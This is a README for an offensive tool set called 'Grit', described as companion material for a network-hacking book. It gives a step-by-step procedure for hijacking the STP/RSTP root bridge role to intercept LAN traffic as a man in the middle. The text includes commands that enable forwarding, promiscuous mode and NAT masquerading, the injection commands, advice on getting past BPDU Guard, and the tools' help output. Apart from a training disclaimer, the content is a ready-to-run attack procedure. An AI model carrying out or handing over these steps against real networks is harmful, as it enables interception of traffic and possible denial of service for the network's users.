# Grit

# These are works from 2022, uploaded specifically for the book Networks Through the Eyes of the Hacker.
# These repositories have nothing to do with Caster's current oeuvre.

STP &amp; RSTP Root Hijacking Exploits

**The author has nothing to do with those who will use these tools for personal purposes to destroy other people's computer networks. The tools are presented for training purposes to help engineers improve the security of their network.**



## 1. Mechanics of the attack.

The basic principle of the tools is to generate an STP/RSTP frame with the lowest priority value. Which in turn allows you to intercept the role of the root switch.
After that, an opportunity will open for a MITM attack, you will partially intercept traffic, not all of it. Keep that in mind.
But don't forget that the BPDU GUARD system can stop you.

Before performing the injection, you should first analyze what type of STP protocol is used. And based on this, to start further...
By the way, nothing prevents an attack against the classic STP using an exploit for RSTP.
If a MITM attack fails, feel free to experiment and try two versions of exploits at once (STP exploit for RSTP, RSTP exploit for STP)
Also, after injection, switch will generate TCN messages (Topology Change Notification)

If there are any problems, write to "Issues"

## 2. Limitations

Depending on the power of your hardware. some host traffic will go through you, you have to withstand this load, otherwise DoS will occur.

## 3. Attack
First you need to install the dependencies.

```
sudo pip3 install -r requirements.txt
```

### 3.1 Enable Forwarding

```
sudo sysctl -w net.ipv4.ip_forward=1
```
### 3.2 Enable Conntrack (nf_conntrack_helper)
```
sudo modprobe nf_conntrack
sudo echo "1" > /proc/sys/net/netfilter/nf_conntrack_helper
```
### 3.3 Promisc mode on interface
```
sudo ip link set ethX promisc on
```
### 3.4 NAT
```
sudo iptables -t nat -A POSTROUTING -o ethX -j MASQUERADE
```

### 3.5 Start of injection.
#### 3.5.1 STP
```
sudo python3 stpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX 
```
#### 3.5.2 RSTP
```
sudo python3 rstpexploit.py --interface ethX --mac XX:XX:XX:XX:XX:XX
```
After executing the injection, you will intercept the role of the root switch. you can track generated STP ads in Wireshark or tcpdump :)



## 4. Help

```
python3 stpexploit.py  --help     

  ▄████  ██▀███   ██▓▄▄▄█████▓
 ██▒ ▀█▒▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░
░▓█  ██▓▒██▀▀█▄  ░██░░ ▓██▓ ░ 
░▒▓███▀▒░██▓ ▒██▒░██░  ▒██▒ ░ 
 ░▒   ▒ ░ ▒▓ ░▒▓░░▓    ▒ ░░   
  ░   ░   ░▒ ░ ▒░ ▒ ░    ░    
░ ░   ░   ░░   ░  ▒ ░  ░      
      ░    ░      ░          

STP Root Hijacking Exploit
For the classic version of Spanning Tree Protocol

Author: Caster, @c4s73r, <c4s73r@protonmail.com>

usage: stpexploit.py [-h] --interface INTERFACE --mac EVILMAC

options:
  -h, --help            show this help message and exit
  --interface INTERFACE
                        Choose the interface to attack
  --mac EVILMAC         Specify your MAC
```

```
python3 rstpexploit.py --help                                                                                                                          

  ▄████  ██▀███   ██▓▄▄▄█████▓
 ██▒ ▀█▒▓██ ▒ ██▒▓██▒▓  ██▒ ▓▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██▒▒ ▓██░ ▒░
░▓█  ██▓▒██▀▀█▄  ░██░░ ▓██▓ ░ 
░▒▓███▀▒░██▓ ▒██▒░██░  ▒██▒ ░ 
 ░▒   ▒ ░ ▒▓ ░▒▓░░▓    ▒ ░░   
  ░   ░   ░▒ ░ ▒░ ▒ ░    ░    
░ ░   ░   ░░   ░  ▒ ░  ░      
      ░    ░      ░          

RSTP Root Hijacking Exploit
For Rapid Spanning Tree Protocol version

Author: Caster, @c4s73r, <c4s73r@protonmail.com>

usage: rstpexploit.py [-h] --interface INTERFACE --mac EVILMAC


options:
  -h, --help            show this help message and exit
  --interface INTERFACE
                        Choose the interface to attack
  --mac EVILMAC         Specify your MAC
```
